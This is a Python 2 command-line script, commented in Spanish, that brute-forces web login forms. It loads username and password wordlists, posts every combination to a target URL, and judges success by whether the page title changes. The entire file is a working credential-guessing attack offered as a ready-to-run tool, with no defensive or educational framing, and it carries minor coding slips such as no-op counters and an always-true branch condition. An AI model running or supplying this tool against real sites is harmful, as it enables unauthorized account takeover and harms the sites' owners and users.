#!/usr/bin/python

import requests
import argparse
import sys
from lxml.html import fromstring
import os.path

arg = ''
url = ''
userField = ''
passField = ''
user = ''
pwd = ''
	

def bruteforce(url, userField, passField, user,pwd):
	users = []
	passwords = []
	i = 0
	j = 0
	
	if os.path.exists(pwd) and os.path.exists(user): # ambos archivos
		
		fo = open(user, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		fo = open(pwd, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(users)):
			for j in range (0,len(passwords)):
				#Antes del ataque
				rb = requests.post(url)
				tree = fromstring(rb.content)
				before = tree.findtext('.//title')
		
				
				#Login
				payload = { userField : users[i], passField: passwords[j]}
				r = requests.post(url, data= payload)
	
				#Login exitoso
				tree = fromstring(r.content)
				after =  tree.findtext('.//title')
				
				if before in after:
					print 'Ataque no exitoso con:'  + "\nUser: " + users[i] + "Password: " + passwords[j]
				else:
					print "Ataque exitoso con:" + "\nUser: " + users[i]  + "Password: " + passwords[j]
					
				j + 1
			i + 1
		exit

	
	elif os.path.exists(user): #archivo con usuarios
		print 'entra usr'
		fo = open(user, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		for i in range(0,len(users)):
		
			#Antes del ataque
			rb = requests.post(url)
			tree = fromstring(rb.content)
			before = tree.findtext('.//title')
		
			#Login
			payload = { userField : users[i], passField: pwd}
			r = requests.post(url, data= payload)
	
			#Login exitoso
			tree = fromstring(r.content)
			after =  tree.findtext('.//title')
	
			if before in after:
				print 'Ataque no exitoso con:'  + "\nUser: " + users[i] + "Password: " + pwd
			else:
				print "Ataque exitoso con:" + "\nUser: " + users[i]  + "Password: " + pwd
		exit
		
	elif os.path.exists(pwd): # Archivo con passwords
		
		fo = open(pwd, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(passwords)):
		
			#Antes del ataque
			rb = requests.post(url)
			tree = fromstring(rb.content)
			before = tree.findtext('.//title')
		
			#Login
			payload = { userField : user, passField: passwords[i]}
			r = requests.post(url, data= payload)
	
			#Login exitoso
			tree = fromstring(r.content)
			after =  tree.findtext('.//title')
	
			if before in after:
				print 'Ataque no exitoso con:'  + "\nUser: " + user + "Password: " + passwords[i]
			else:
				print "Ataque exitoso con:" + "\nUser: " + user  + "Password: " + passwords[i]
		exit
	
	else: # ambas variables
		#Antes del ataque
		rb = requests.post(url)
		tree = fromstring(rb.content)
		before = tree.findtext('.//title')
	
		#Login
		payload = { userField : user, passField: pwd}
		r = requests.post(url, data= payload)
	
		#Login exitoso
		tree = fromstring(r.content)
		after =  tree.findtext('.//title')
		if before in after:
			print 'Ataque no exitoso con:'  + "\nUser: " + user + " Password: " + pwd
		else:
			print "Ataque exitoso con:" + "\nUser: " + user  + " Password: " + pwd
		exit

def getParams(arg):
	parser = argparse.ArgumentParser(description='Fuerza Bruta',
		formatter_class=argparse.ArgumentDefaultsHelpFormatter)

	parser.add_argument('-b', '--bruteforce',
	nargs=5,metavar=('url','CampoUsuario','CampoPass', 'Usuario', 'Password') ,help='help:')
					
	
	options = parser.parse_args()
	
	if len(sys.argv) == 1:
		print parser.print_help()
	
	elif '-b' in sys.argv or '--bruteforce':
		bruteforce(options.bruteforce[0],options.bruteforce[1],options.bruteforce[2],options.bruteforce[3], options.bruteforce[4])
		
getParams(arg)

